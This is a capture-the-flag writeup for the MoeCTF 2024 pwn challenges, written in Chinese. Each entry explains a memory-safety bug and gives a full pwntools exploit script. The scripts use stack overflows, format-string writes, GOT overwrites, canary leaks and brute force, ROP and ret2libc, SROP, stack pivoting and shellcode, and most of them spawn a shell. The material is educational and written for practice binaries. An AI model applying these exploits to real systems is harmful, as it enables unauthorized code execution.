# MoeCTF 2024 Pwn Writeup

## 二进制漏洞审计入门指北

用 Netcat（nc）连接在线环境稍等即可获得 flag。

## NotEnoughTime

本题考察 Pwntools 基本用法，虽然是简单的计算加减乘除，但是在输出算式时刻意添加延迟营造网络卡顿环境，并且算式存在多行情况，意在引导使用 `recvuntil`。注意在使用 Python `eval` 前需要去除多行算式中的 `\n` 以及末尾的 `=` 以符合 Python 语法。除法是整数除法，在 Python 语法中为 `//`。

比赛期间注意到很多选手把除法看作浮点数运算，由此触发了许多奇怪的 bug（出题时并没有考虑到会有浮点数输入的情况）。于是临时新增了一个提示。

Exp:

```Python
from pwn import *

io = ...

io.sendlineafter(b"=", b"2")
io.sendlineafter(b"=", b"0")
io.recvuntil(b"!")

for _ in range(20):
    io.sendline(
        str(
            eval(
                io.recvuntil(b"=")
                .replace(b"\n", b"")
                .replace(b"=", b"")
                .replace(b"/", b"//")
                .decode()
            )
        ).encode()
    )

io.interactive()
```

## no_more_gets

主函数结束方式为正常 return，此时程序执行流会跳转到先前调用主函数时保存在栈中的返回地址所指向的位置。但是由于栈向低地址扩展（反向），而字符串写入由低地址向高地址（正向），且程序执行时先保存返回地址再开辟用于存储栈上字符串的空间，所以返回地址位于读入字符串的高地址处且可因字符串溢出而被修改。`gets` 在读入字符串时不会检查长度，可以任意长度溢出。因此只需覆盖返回地址至 `my_shell` 即可。别忘了返回地址前还保存了栈指针，虽然其值对解本题无影响，但是需要因此多覆盖8 字节。

注意调用 `system` 时的栈对齐问题。如果直接返回至 `backdoor`，程序运行时触发 SIGSEGV（段错误）。用 GDB 调试运行（pwntools `gdb` 模块能帮到你），程序在 `system` 函数中这个指令处崩溃：

```assembly
movaps xmmword ptr [rsp + 0x50], xmm0
```

其实是 `movaps` 指令要求目标地址（此处为 `rsp + 0x50`）16 字节对齐（能被 16 整除）导致的。通过将劫持的地址 +1，跳过 `backdoor` 中的 `push rbp`（该指令机器码长度 1 字节）从而使 `rsp` 16 字节对齐。

Exp:

```Python
from pwn import *

io = ...

# backdoor = 0x401176
backdoor = 0x401177 # 地址 +1 跳过 `push rbp` 使栈指针在调用 `system` 时 16 字节对齐。

payload = cyclic(88) + p64(backdoor)
io.sendlineafter(b".\n", payload)

io.interactive()
```

## Moeplane

```c
struct airplane {
    long flight;  // 目标：50 40 30 20 10 00 00 00 (hex)
    int altitude; // 4 字节
    int velocity; // 4 字节
    int angle;    // 4 字节
    unsigned char engine_thrust[ENGINES]; // 距离 `flight` 12 字节
} moeplane;
```

附件只给出了 Moeplane 相关数据的结构体，可以看到 `engine_thrust` 是一个数组。由于题目能操作的地方实在有限，唯一可疑的是 `which engine`。输入一个大于 4 的数，程序输出 `engine not found`；但是当输入一个负数或者超过 INT_MAX（2147483647）的大数时，程序并不会输出 `engine not found`，而是直接终止或表现异常，说明我们修改到非预期范围的数据。我们只讨论负数 index：由于 C 语言中数组下标访问只是简单的 数组基址 + 偏移量，且不会检查边界，考虑小端存储，`engine_thrust[-13]` 即为 `flight` 最高位。然而直接修改最高位将 `flight` 变为超大数字会触发题目程序的“防作弊”检查，由目标里程为 0x1020304050，可计算出 `engine_thrust[-16]` 对应 `flight` 中目标里程数据的最高位，应从此开始修改。由于 `engine_thrust` 为 uchar 数组，需要逐字节修改 `flight`。注意实际 index 为 输入值 - 1。

**综上，依次输入 1 -15 16 1 -16 32 1 -17 48 稍作等待即可。**

整数上溢为有符号整数负数的 index 也可达到相同效果：依次输入：1 4294967281 16 1 4294967280 32 1 4294967279 48 稍作等待即可。 

C 语言不同平台的 `int` 和 `long` 大小不同，正因此附件图片中给出了结构体的 size 和 alignment，应该不会有歧义。

## flag_helper

首先抱歉，这道题由于出题人经验不足，做起来可能莫名其妙，还请谅解。

简化的程序关键流程：

```c
// ... 输入 `file`、`flags`
open("/dev/random", 0);
open("/dev/urandom", 0);
open(file, flags);
open("/dev/zero", 0);
// ... 输入 `prot`、`flags`
char *buf = mmap(NULL, 0x50, prot, flags, -1, 0);
// ... 输入 `fd`
read(fd, buf, 0x50);
write(stdout, buf, 0x50);
```

此题考查 Linux API 基础，答案不唯一。输入 /flag 作为待读取文件。`open` /flag 时需要读权限标记（`flags`）`O_RDONLY`（0），`mmap` 空间时需要读写权限（`prot`）`PROT_READ | PROT_WRITE`（3）及 `MAP_ANONYMOUS | MAP_PRIVATE` 标记（34）。由于开启 /flag 前已经开启了两个文件，加上 `stdin` `stdout` `stderr`，/flag 的 fd 应是 5。除文件名外程序只接受对应的参数的十进制数值，上述宏的值可通过对应头文件查得，或手动在本地输出它们对应的值。

其实 `mmap` 大致存在两种用法，常见的是将文件映射到内存上，还有一种比较陌生的用法是分配匿名空内存块，本题中 `mmap` 用法为后者（为之后的 shellcode 题目作铺垫）。本题表述不够清晰且没给程序附件，因此赛中给出了提示：“`mmap` 传入的 `fd` 是 `-1`”，指明 `mmap` 用法。

**综上，依次输入：4 /flag 0 3 34 5 即可。**

## 这是什么？random！

题目为猜数字游戏，生成随机数的种子是 一年中当前天数 **- 1**（`localtime(...).tm_yday`）。照抄附件程序中生成随机数的逻辑并预先生成好 10 个随机数并依次输入即可。为方便，也可使用 Python `ctypes`。

Exp:

```python
from pwn import *
from ctypes import cdll
from time import localtime

io = ...

libc = cdll.LoadLibrary("libc.so.6")
libc.srandom(localtime().tm_yday - 1) # 注意 Python `time.localtime` 与 C 标准库的同名函数行为不同。

for _ in range(10):
    io.sendlineafter(b"\n", str(libc.random() % 90000 + 10000).encode())

io.sendlineafter(b"\n", str(42).encode()) # 任意值
io.sendlineafter(b"\n", str(42).encode()) # 任意值

io.interactive()
```

## 这是什么？shellcode！

没有任何检查关闭 NX 保护直接执行栈上 shellcode（直接输入）。

Exp:

``` python
from pwn import *

context(os="linux", arch="amd64")
io = ...

io.send(asm(shellcraft.sh()))

io.interactive()
```

## 这是什么？libc！

程序本身没有 `pop rdi` 等用于传递参数的 gadget，也没有可以 getshell 的函数（`system`、`execve` 等）需要从 libc 中获取。一般 glibc 中会有 `/bin/sh` 字符串和 `system` 函数，找到它们的偏移量，再通过给出的 `puts` 地址减去 `puts` 在 libc 中偏移量计算 `libc` 基址，配合 libc 中的 x86_64 传参 gadget（`pop rdi`...）就能 getshell 了。

此时再次遇到栈指针 16 字节对齐问题，通过在 ROP 链中添加空 gadget（仅 `ret`）将栈指针移动 8 字节解决。

Exp:

```python
from pwn import *

context(os="linux", arch="amd64")

io = ...
libc = ELF("./libc.so.6")

io.recvuntil(b"0x")
libc.address = int(io.recv(12), 16) - libc.sym["puts"]

payload = cyclic(9) + flat([
        libc.search(asm("pop rdi; ret;")).__next__() + 1, # 即 `ret`，用于栈指针对齐
        libc.search(asm("pop rdi; ret;")).__next__(),
        libc.search(b"/bin/sh\x00").__next__(),
        libc.sym["system"],
])
io.sendafter(b">", payload)

io.interactive()
```

## 这是什么？GOT！

`Partial RELRO`，程序直接读取输入至 GOT 表，覆盖 `exit` 项为 `unreachable` 地址即可。另外注意不要覆盖 `system` GOT 项初始值（还未调用）。

Exp:

``` python
from pwn import *

io = ...

system_plt_ld = 0x401056 # system GOT 初始值
unreachable = 0x401196

io.send(cyclic(0x10) + p64(system_plt_ld) + cyclic(0x20) + p64(unreachable))

io.interactive()
```

## 这是什么？32-bit！

`scanf("%[^\n]s", buf);` 无限长栈溢出（其实 `%s` 就好），32 位栈传参，覆盖栈上返回地址和参数即可。

Exp:

```python
from pwn import *

context(os='linux', arch='i386')
io = ...
e = ELF('./backdoor')

io.sendline() # getchar()
payload  = cyclic(0x28 + 4)
payload += flat([
    e.sym[b'execve'],           # `vuln` 返回地址
    0,                          # `execve` 返回地址
    next(e.search(b'/bin/sh')), # `execve` 参数 `pathname`
    0,                          # `execve` 参数 `argv`
    0                           # `execve` 参数 `envp`
])
io.sendline(payload)

io.interactive()
```

## ez_shellcode

```python
from pwn import *
context.terminal = ['wt.exe','wsl']
context.log_level = 'debug'
context.arch = 'amd64'
p = process('./pwn')
p.recvuntil("age")
p.sendline('130')
p.recvuntil("you :\n")
buf_addr = int(p.recvuntil('\n').decode(), 16)
log.success(buf_addr)
log.success(type(buf_addr))
payload = asm(shellcraft.sh()).ljust(0x68,b'a') + p64(buf_addr)
p.recvuntil("say")
p.send(payload)
p.interactive()
```

很简单的ret2shellcode

## leak_sth

```python
from pwn import *
context.terminal = ['tmux', 'split-window', '-h']
context.log_level = 'debug'
p = gdb.debug("./f")
p.recvuntil("name?")
p.send("%7$ld")

p.recvuntil("name:\n")
num = int(p.recvuntil('G')[:-1])

p.recvuntil("number")
p.send(str(num))

p.interactive()
```

​	简单的格式化字符串泄露栈上信息。当然，直接打random也可以（参考“这是什么？random！”），这里是出题人考虑不周了ORZ

## login system

> 一个简单的登陆系统，但是为什么要输出用户名？
>
> 
>
> hint
>
> - printf 只能用来输出吗？好像还能用来写内存？

预期难度：Easy++

通过栈上格式化字符串漏洞覆盖`password`全局变量，板子题。要注意的是格式化字符串应该在前面，而地址应该在后面，不然格式化字符串会被`\x00`截断。



**exp**

```python
#! /usr/bin/env python3.8
from pwn import *
from ctools import *

context(os="linux", arch="amd64")
TMUX_TERMINAL()
# context.log_level = "debug"

elf_path = './pwn'
libc_path = './libc.so.6'

init_elf_with_libc(elf_path, libc_path)
DEBUG = lambda script = '': gdb.attach(io, gdbscript=script)

conn_context(host='127.0.0.1', port=33577, level=REMOTE, elf=elf_path)

elf = ELF(elf_path)
# libc = ELF(libc_path, checksec=False)
io = conn()
    
def exp():
    pad = b'%9$ln'.ljust(0x8, b'\x00') + p64(0x404050)
    io.sendlineafter(b'username', pad)
    
    io.sendafter(b'password', b'\x00' * 0x8)
    pass

try:
    exp()
    io.interactive()
finally:
    rm_core()
```

## Catch_the_canary!

本题实际上是在考验三种绕过 canary 的方法。

第一种：模拟 32 位环境下 canary 有效大小仅三字节，可以爆破。（实际场景是新开线程，新线程与主线程 canary 一致，新线程崩溃不导致主线程崩溃。）

第二种：输入时跳过 canary。例如 `scanf` 在读取数字时，输入 `+` 或 `-` 可跳过输入。

第三种：通过溢出读取填满 canary 的首空字节再输出从而泄漏 canary。

Exp:

```python
from pwn import *

io = ...
# unreachable = 0x4012a8
unreachable = 0x4012ad # 跳过 `push rbp`

io.sendline(str(0x00abcd00).encode())
for i in range(0x00ffdcba, 0x01000000):
    io.sendlineafter(b'n.\n', str(i).encode())
    rec = io.recvuntil(b'] ')
    if b'Error' not in rec:
        break

io.sendlineafter(b't.\n', b'-')
io.sendline(b'1')
io.sendline(str(0xbacd003).encode())

io.send(cyclic(25))
io.recvuntil(b'g')
canary = b'\x00' + io.recvn(7)
io.send(cyclic(24) + canary + cyclic(8) + p64(unreachable))

io.interactive()
```

## System_not_found!

第一次 `read` 缓冲区溢出能够修改栈上传给 `nbytes` 参数的变量的值，之后获得一次“无限”长栈溢出机会。但是程序中不存在 `pop rdi` gadget。观察 `main` 运行到即将返回时 `rdi` 的值，发现其值恰好为 libc 里的函数 `funlockfile` 地址的地址，于是此时若直接返回至 `puts` 即可泄漏 libc 基址。第一次 ROP leak libc 并回到 main，第二次 ROP getshell。

Exp:

```python
from pwn import *

context(os='linux', arch='amd64')
io = ...
e = ELF('./dialogue')
libc = ELF('./libc.so.6')

io.sendafter(b'> ', cyclic(0x10) + p64(1000)[:6]) # `nbytes` 过大可能打不通远程
io.sendafter(b'> ', cyclic(32 + 8 + 8) + p64(e.plt['puts']) + p64(e.sym['main']))
io.recvuntil(b'.\n')
funlockfile_addr = u64(io.recvn(6).ljust(8, b'\x00'))
libc_base_addr = funlockfile_addr - libc.symbols['funlockfile']
bin_sh = libc_base_addr + libc.search(b'/bin/sh').__next__()
pop_rdi = libc_base_addr + libc.search(asm('pop rdi; ret;')).__next__()
pop_rsi = libc_base_addr + libc.search(asm('pop rsi; ret;')).__next__()
execve = libc_base_addr + libc.symbols['execve']
io.sendafter(b'> ', cyclic(0x10) + p64(1000)[:6])
io.sendafter(b'> ', cyclic(32 + 8 + 8) + p64(pop_rdi) + p64(bin_sh) + p64(pop_rsi) + p64(0) + p64(execve))

io.interactive()
```

即使没有注意到 `rdi`，还有一种更复杂的栈迁移解法，见题目“栈的奇妙之旅”。

## NX_on!

exp :

```python
from pwn import *
context.terminal = ['wt.exe', 'wsl']
context.log_level = 'debug'
context.arch = 'amd64'
p = remote('127.0.0.1',38265)
#p = process('./pwn')

rax_ret = 0x00000000004508b7
rdi_ret = 0x000000000040239f
rsi_ret = 0x000000000040a40e  
rdx_ret = 0x000000000049d12b
syscall = 0x0000000000402154
binsh = 0x00000000004e3950

junk = b'A' * 0x18
payload1 = junk + b'B'
p.recvuntil('id?')
p.send(payload1)
p.recvuntil(junk)
leak_canary = u64(b'\x00' + p.recv(8)[1:])
log.success(hex(leak_canary))

payload2 = b'C' * 0x18 + p64(leak_canary) + b'junkjunk' + p64(rax_ret) + p64(59)
payload2 += p64(rdi_ret) + p64(binsh)
payload2 += p64(rsi_ret) + p64(0)
payload2 += p64(rdx_ret) + p64(0) + p64(0)
payload2 += p64(syscall)
p.recvuntil('name?\n')
p.sendline(payload2)
p.recvuntil('quit\n')
p.sendline('-11111')
p.interactive()
```

​	第一次输入将`canary`低位的`'\x00'`覆盖为其他值，可直接泄露`canary`其余高位。将`canary`补齐后即可利用```void *memcpy(void *dest, const void *src, size_t n)```中长度参数`n`对传入的实参直接解析为无符号的数值的性质，绕过字节数检查实现栈溢出。

​	其中，对```void *memcpy(void *dest, const void *src, size_t n)```传入负值属于本程序中该函数的非预期行为，因此很多负值输入进去后会直接导致程序崩溃，这里举两个例子：

### `-1`为什么不行

先说`-1`为什么不行吧，运行后发现它出错是因为`RIP`被置为0了（无效的地址）。 进gdb调试一下，发现问题出在调用`memcpy()`函数之后栈顶返回地址被置为0了，因此在执行ret时会直接报段错误。 问题指令：

```
 ► 0x4482b7 <__memmove_avx_unaligned_erms+567>    vmovdqa ymmword ptr [rcx + 0x60], ymm1
```

在执行这条指令之前，rsp为：

```
RSP 0x7ffdb7f2e018 —▸ 0x401cae (func+308) ◂— jmp 0x401cbf
```

执行之后：

```
RSP 0x7ffdb7f2e018 ◂— 0
```

这里是因为`RCX`寄存器中的地址太靠近栈顶了。

```
pwndbg> p $rcx + 0x60
$1 = 140732357202144
pwndbg> p $rsp - $1
$2 = (void *) 0x18
```

注意 ： `ymmword` 大小为32字节，因此显然这里往高地址复制的时候rsp指向的返回地址被覆盖率 RCX在执行到这步之前进行了多次改变，受到输入数值大小的影响。

### `-2147483528`为什么不行

至于`-2147483528`为什么不行，则是另一个原因：

```
► 0x44828c <__memmove_avx_unaligned_erms+524>    vmovdqu ymm8, ymmword ptr [rsi + rdx - 0x20]
```

如你先前所说，程序卡在这里。

```
pwndbg> p/d $rdx
$4 = -2147483528
```

`rdx`中存有你输入`的size`。

```
pwndbg> p/x $rsi + $rdx - 0x20
$2 = 0xffffffff804e5bb8
pwndbg> x/x $2
0xffffffff804e5bb8:     Cannot access memory at address 0xffffffff804e5bb8
```

从这个结果来看程序显然无法访问到 `[rsi + rdx - 0x20]`,那么试图从这里加载数据自然会导致错误。

总的来讲，其实对`memcpy()`传入负值本就会导致非预期的行为，其内部的较复杂指令实现会导致不能很好掌控输入负值后的结果。

## shellcode_revenge

```python
from pwn import *

p = process('./pwn')
context.arch = 'amd64'
context.log_level = 'debug'
s = shellcraft
gdb.attach(p)
pause()
shellcode = '''
mov rdx, 0x2000
add rsi, 0xd
syscall
'''

payload1 = asm(shellcode)

payload2 = s.open('./flag')
payload2 += s.read(3,0x20240000 + 300,100)
payload2 += s.write(1,0x20240000 + 300,100)

payload2 = asm(payload2)

def io(n) :
    p.recvuntil(">>>")
    p.sendline(str(n))

io(3)
p.recvuntil("255")
p.sendline(str(-8))
p.recvuntil("?")
p.sendline(str(1111))

io(4)
p.recvuntil("luck.")
p.send(payload1)
p.send(payload)

sleep(1)
p.interactive()
```

​	本题目中决定权限的level处于`.bss`段上， 因此可以通过名称数组负索引访问修改。（当然，直接用random也能秒T.T）

​	修改level后， 就可以构造`shellcode`了，这里由于可读入的空间有限，可以考虑重新调用`read()`, 由于前面刚刚调用过`read()`，因此其中的`rdi`与`rax`无需再进行设置，只需要修改`rdx`和`rsi`即可，使新调用的`read`能在本段`shellcode`后面读入足够长的字节

​	由于开启了沙箱，后面直接`orw`即可。

## Pwn_it_off!

`voice_pwd` 中存在未初始化的字符串。此时 `password` 位于栈中，其值为刚结束的 `beep` 中残留的随机字符串。只需将程序之前输出的最后一个随机字符串部分重复输入即可通过。

然而，在 `num_pwd` 中会检查密码是否为五位十进制数，且也存在未初始化栈上变量，即使在 `num_pwd` 输入“正确”的密码，也无法通过数字大小检查。注意到 `voice_pwd` 中程序通过`strcmp` 比对字符串，C 语言用 `'\x00'` 标志字符串末尾，同时 `strcmp` 字符串比对也会到此终止，从而绕过检查。在 `voice_pwd` 输入正确密码和`'\x00'` 后添加“二进制”形式的数字，使其稍后处于 `num_pwd` 中的 password 变量。

栈布局：（1 字符 == 1 字节，`*` 为用户输入、`#` 为已知随机值、`-` 为未知随机值）

```
栈顶（低地址）
beep:       voice_pwd:  num_pwd:
  ----beep    
  ########
  ########
  ########
  ########<-->#voipwd#
  ########    ########
  ########    *inputs*
  ########    ********    *inputn*
  ####----    ********<-->*numpwd*
  -canary-    -canary-    -canary-
栈底（高地址）
```

Exp:

```python
from pwn import *

io = ...

last_line = bytes()
while True:
    line = io.recvline()
    if b"[Error]" in line:
        break
    last_line = line

password = last_line[28 : 28 + 15]
io.sendafter(b"voice password.\n", password + b"\x00" + p64(12345)[0:7]) # 任意五位数
io.sendlineafter(b"numeric password.\n", b"12345")

io.interactive()
```

## Read_once_twice!

第一次 `read` 填充 canary null byte 泄漏 canary；

第二次 `read` 绕过 canary 同时修改 retaddr 低位至 backdoor。

适当爆破（成功率 1/16）即可成功。

Exp:

```python
from pwn import *

e = ELF("./twice")

while True:
    global io
    io = ...
    io.recv()
    io.send(cyclic(25))
    io.recvn(25)
    canary = b"\x00" + io.recvn(7)
    io.send(cyclic(24) + canary + cyclic(8) + p64(e.sym["backdoor"] + 1)[0:2])
    try:
        io.sendafter(b"hand.\n", b"ls") # 测试是否成功
    except Exception:
        continue
    break

io.interactive()
```

## Where is fmt?

> 你说得对，但是我的 fmt 在哪？
>
> 
>
> hint
>
> - 栈上有些比较长的链子，可以想一下怎么利用这些链子

预期难度：Normal++

bss 段上 fmt，有 3 次机会，给后门，也是标准的板子

- 第一次 leak stack
- 第二次改栈上的一个比较长的链子，使其指向返回地址
- 第三次通过修改后的指针来修改返回地址。但是这里为了栈对齐需要跳过最前面`push rbp`



**exp**

```python
#! /usr/bin/env python3.8
from pwn import *
from ctools import *

context(os="linux", arch="amd64")
TMUX_TERMINAL()
# context.log_level = "debug"

elf_path = './pwn'
libc_path = './libc.so.6'

init_elf_with_libc(elf_path, libc_path, force=True)
DEBUG = lambda script = '': gdb.attach(io, gdbscript=script)

conn_context(host='127.0.0.1', port=9999, level=LOCAL, elf=elf_path)

elf = ELF(elf_path)
libc = ELF(libc_path, checksec=False)
io = conn()

def exp():
    pad = b'%15$p'
    io.sendlineafter(b'3 chances', pad)

    io.recvuntil(b'0x')
    stack = int(io.recv(12), 16) - 0x120
    success(hex(stack))
    
    pad = f'%{stack & 0xffff}c%15$hn'.encode()
    io.sendlineafter(b'chances', pad)
    
    backdoor = elf.symbols['backdoor'] + 5 # skip 'push rbp'
    pad = f'%{backdoor & 0xffff}c%{0x27 + 6}$hn'.encode()
    # DEBUG()
    io.sendlineafter(b'chances', pad)

    pass

try:
    exp()
    io.interactive()
finally:
    rm_core()
```

## return15

> 这怎么有一个 F ？

预期难度：Normal

最简单的 srop 板子，题目还给了`/bin/sh`字符串，直接用 pwntools 一把梭就行



**exp**

```python
#! /usr/bin/env python3.8
from pwn import *
from ctools import *

context(os="linux", arch="amd64")
TMUX_TERMINAL()
# context.log_level = "debug"

elf_path = './pwn'
libc_path = './libc.so.6'

init_elf_with_libc(elf_path, libc_path)
DEBUG = lambda script = '': gdb.attach(io, gdbscript=script)

conn_context(host='127.0.0.1', port=9999, level=LOCAL, elf=elf_path)

elf = ELF(elf_path)
# libc = ELF(libc_path, checksec=False)
io = conn()
    
def exp():
    syscall_ret = 0x40111C
    mov_rax_15 = 0x40110A
    binsh = 0x402008

    frame = SigreturnFrame() # syscall execve
    frame.rax = 0x3b # syscall code
    frame.rdi = binsh
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = syscall_ret

    pad = b'a' * 0x28 + p64(mov_rax_15) + p64(syscall_ret)
    pad += bytes(frame)
    io.sendline(pad)
    
    pass

try:
    exp()
    io.interactive()
finally:
    rm_core()
```

## Got it!

> You GOT it?
>
> - What is `Partial RELRO`?
>
> 
>
> hint
>
> - libc 里函数之间的偏移的固定的，可以通过一个已知函数加上一个偏移来获得任意一个函数的地址

预期难度：Normal

索引越界，可以改到 now_save 指针，修改其指向 puts@GOT，然后通过 add 加上`system - puts`即可拿到 system 函数。然后通过在 saves 数组开始位置布置`/bin/sh\x00`来 getshell



**exp**

```python
#! /usr/bin/env python3.8
from pwn import *
from ctools import *

context(os="linux", arch="amd64")
TMUX_TERMINAL()
# context.log_level = "debug"

elf_path = './pwn'
libc_path = './libc.so.6'

init_elf_with_libc(elf_path, libc_path)
DEBUG = lambda script='', load=True: mydebug(io, gdbscript=script, load_symbol=load)

conn_context(host='127.0.0.1', port=9999, level=REMOTE, elf=elf_path)

elf = ELF(elf_path)
libc = ELF(libc_path, checksec=False)
io = conn()
    
def exp():
    def add(num):
        io.sendlineafter(b'> ', b'1')
        io.sendlineafter(b'Operand', str(num).encode())
    def sub(num):
        io.sendlineafter(b'> ', b'2')
        io.sendlineafter(b'Operand', str(num).encode())
        
    io.sendlineafter(b'3. Exit', b'1')
    io.sendlineafter(b'use?', b'0')
    add(u64(b'/bin/sh\x00'))
    io.sendlineafter(b'> ', b'5')

    io.sendlineafter(b'3. Exit', b'1')
    io.sendlineafter(b'use?', b'16')

    sub(0x100)
    add(libc.symbols['system'] - libc.symbols['puts'])

    # DEBUG()
    io.sendline(b'5')
    io.sendline(b'3')
    
    pass

try:
    exp()
    io.interactive()
finally:
    exp_fini()
```

## One Chance!

> 只有一次机会怎么构造？
>
> 
>
> hint
>
> - 位置指定的格式化字符，例如`%10$p`，是在什么时候解析的？

预期难度：Hard--

**题目分析**

程序给了栈地址和后门函数，但只有一次构造的机会，并且 fmt 在 bss 段上。我们的目标当然是修改返回地址到后门上。

可以很容易就会想到，我们先修改一次栈上的链子到返回地址上，然后通过链子直接改返回地址的低字节到后门上。于是我们就会构造出类似`'%...c%15$hn' + '%...c%45$hhn'`这种 payload，但是实际运行后发现打不通。

这和 printf 的解析机制有关：在 printf 函数遇到第一个位置指定的格式化字符串`%15$hn`后，就会把整个格式化字符串中的位置指定的字符一起解析了，也就是说这时`%45$hhn`已经被解析了，并且拿到的地址是一个与返回地址没有任何关系的栈地址。而之后我们才将 45 位置的值改成返回地址，但这时已经没用了。

而要绕过这个机制也简单：如果 printf 在遇到第一个位置指定的格式化字符后才会触发这种机制，那我们就先不使用这种格式化字符不就行了？所以我们在前面可以构造`'%c' * 13 + f'%{ret_addr - 13}c%hn'`这种 payload，这会向 15 位置的地址的值修改，但是却不会触发这种机制。

**实现**

虽然题目开启了 PIE，但因为返回地址和后门函数只相差了一个字节，所以我们直接覆盖最低字节到后门就行了。

1. 第一步我们先构造`'%c' * 13 + f'%{ret_addr - 13}c%hn'`来修改一个栈上指针指向返回地址。
2. 然后就是构造要写入返回地址中的值。
   1. 先使用`((ret_addr + 0xff) & ~0xff)`将字符数向 0x100 对齐
   2. `+ (backdoor & 0xff)`来将最低字节设置成 backdoor 地址的最低字节
   3. ` - ret_addr`第二次要打印的字符数

**exp**

```python
#! /usr/bin/env python3.8
from pwn import *
from ctools import *

context(os="linux", arch="amd64")
TMUX_TERMINAL()
# context.log_level = "debug"

elf_path = './pwn'
libc_path = './libc.so.6'

init_elf_with_libc(elf_path, libc_path)
DEBUG = lambda script = '': gdb.attach(io, gdbscript=script)

conn_context(host='127.0.0.1', port=9999, level=REMOTE, elf=elf_path)

elf = ELF(elf_path)
# libc = ELF(libc_path, checksec=False)
io = conn()
    
def exp():
    io.recvuntil(b'0x')
    ret_addr = int(io.recv(12), 16) + 0x18
    success(hex(ret_addr))

    ret_addr = ret_addr & 0xffff
    backdoor = elf.symbols['b2c4do0r']

    pad = '%c' * 13 + f'%{ret_addr - 13}c%hn'
    pad += f'%{((ret_addr + 0xff) & ~0xff) + (backdoor & 0xff) - ret_addr}c%{0x27 + 6}$hhn'
    pad = pad.encode()
    # DEBUG()
    io.sendlineafter(b'chance', pad)
    
    pass

try:
    exp()
    io.interactive()
finally:
    rm_core()
```

## 栈的奇妙之旅

> 传说中只要让内存另一边的“栈”现身在人间，就可以获得无穷的力量。你能把他请出来吗？
>
> - 栈只能在栈区上吗？
> - 本题要求对栈的理解较高，要有大量动态调试的心理准备

预期难度：Hard

依然是板子题，需要熟悉汇编`leave ; ret`。栈迁移 2 次

- 第一次将栈转移到 bss 段上，并 leak libc
- 第二次 getshell

**exp**

```python
#! /usr/bin/env python3.8
from pwn import *
from ctools import *

context(os="linux", arch="amd64")
TMUX_TERMINAL()
# context.log_level = "debug"

elf_path = './pwn'
libc_path = './libc.so.6'

init_elf_with_libc(elf_path, libc_path)
DEBUG = lambda script = '': gdb.attach(io, gdbscript=script)

conn_context(host='127.0.0.1', port=9999, level=LOCAL, elf=elf_path)

elf = ELF(elf_path)
libc = ELF(libc_path, checksec=False)
io = conn()

def exp():
    leave = 0x4011fc
    pop_rdi = 0x4011c5

    bss = 0x404000 + 0x200
    main = 0x4011E5

    pad = b'a' * 0x80 + p64(bss) + p64(main)
    io.sendafter(b'me?', pad)

    pad = flat([
        bss + 0x600,
        pop_rdi, elf.got['puts'],
        elf.plt['puts'],
        main
    ]).ljust(0x80, b'\x00') + p64(bss - 0x80) + p64(leave)
    io.send(pad)

    io.recvuntil(b'\n')
    libc.address = u64(io.recv(6).ljust(8, b'\x00')) - libc.symbols['puts']
    success('libc.address: ' + hex(libc.address))

    pad = flat([
        bss, 
        pop_rdi, libc.search(b'/bin/sh').__next__(),
        pop_rdi + 1,
        libc.symbols['system']
    ]).ljust(0x80, b'\x00') + p64(bss + 0x600 - 0x80) + p64(leave)
    io.send(pad)

    pass

try:
    exp()
    io.interactive()
finally:
    rm_core()
```

## Goldenwing

> 你能打败 Goldenwing 吗？
>
> - 本题可能有点难度，如果现在完全没有想法可以先放放以后再写
>
> 
>
> hint
>
> - 俗话说“负负得正”
> - 可以往栈上写一段东西，或许可以可以先提前进行栈布局？
> - 一次格式化字符串漏洞只能写一次吗？

预期难度：Hard

**题目分析**

菜单中有个隐藏选项`0xcafebabe`，选择后可以向栈上写一些数据；在`practice`函数里我们可以输入要增长的 hp 和 power 值，这里限制了增长值不能太高，但却并没有限制输入负数，而 hp 和 power 都是无符号整数，所以我们可以通过无符号整数的下溢来使 hp 和 power 变得很大从而打败 boss

同时我们发现程序没有后门，但 GOT 表可写并且没开 PIE，在打败 boss 后可以使用 2 次 bss 段上的格式化字符串漏洞。

虽然在打败 boss 前我们只知道 elf 基址，但由于 GOT 表可写，所以我们可以先向栈上写 puts@got。在打败 boss 后我们使用第一次机会来 leak libc，然后在第二次修改 puts@got 为 system 函数。后面的`puts(buf)`就会变成`system(buf)`，如果我们再控制 buf 的前 8 字节为`/bin/sh\x00`就可以直接 getshell

**实现**

这道题最大的考点其实是栈排布和在一次修改中改两次。因为在 libc 中两个函数之间最多差 3 字节，但是如果想只修改一次的话，只能改 4 字节，这时候打印出的字符数就可能会有上亿次，内存爆了都打不通（。这时我们可以用一种更加优雅的方法：将这 3 字节分割成两次：第一次先写 1 字节，第二次再写 2 字节。这样需要的时间就会大大减少。

我们向栈上写的 payload 就变成了`b'/bin/sh\x00' + p64(elf.got['puts']) + p64(elf.got['puts'] + 1)`



**exp**

```python
#! /usr/bin/env python3.8
from pwn import *
from ctools import *

context(os="linux", arch="amd64")
TMUX_TERMINAL()
# context.log_level = "debug"

elf_path = './pwn'
libc_path = './libc.so.6'

init_elf_with_libc(elf_path, libc_path)
DEBUG = lambda script = '': gdb.attach(io, gdbscript=script)

conn_context(host='127.0.0.1', port=9999, level=REMOTE, elf=elf_path)

elf = ELF(elf_path)
libc = ELF(libc_path, checksec=False)
io = conn()
    
def exp():
    io.sendlineafter(b'continue', b'')
    io.sendlineafter(b'Choice', b'2')
    io.sendlineafter(b'hp', b'-100')
    io.sendlineafter(b'power', b'-100')
    
    io.sendlineafter(b'Choice', str(0xcafebabe).encode())
    pad = b'/bin/sh\x00' + p64(elf.got['puts']) + p64(elf.got['puts'] + 1)
    io.sendlineafter(b'here', pad)
    
    io.sendlineafter(b'Choice', b'3')
    pad = b'%3$p'
    io.sendlineafter(b'them', pad)
    io.recvuntil(b'0x')
    libc.address = int(io.recv(12), 16) - libc.symbols['write'] - 23
    success(hex(libc.address))
    
    system = libc.symbols['system']
    pad = f'%{system & 0xff}c%17$hhn'
    pad += f'%{((system >> 8) & 0xffff) - (system & 0xff)}c%18$hn'
    # DEBUG()
    io.sendline(pad.encode())
    
    pass

try:
    exp()
    io.interactive()
finally:
    rm_core()
```

## VisibleInput

```python
from pwn import *
from ae64 import AE64

p = gdb.debug('./pwn')

context.arch = 'amd64'
context.terminal = ['tmux', 'split-w', '-h']
context.log_level = 'debug'
s = shellcraft

payload = s.open('./flag')
payload += s.read(3,0x20240000,30)
payload += s.write(1,0x20240000,30)

ss = AE64().encode(asm(payload),'rdx',0,'fast')

p.send(ss)
p.interactive()
```

只是想让大家了解`AE64`这个工具，如果使用工具的话题目本身并没有难度。 

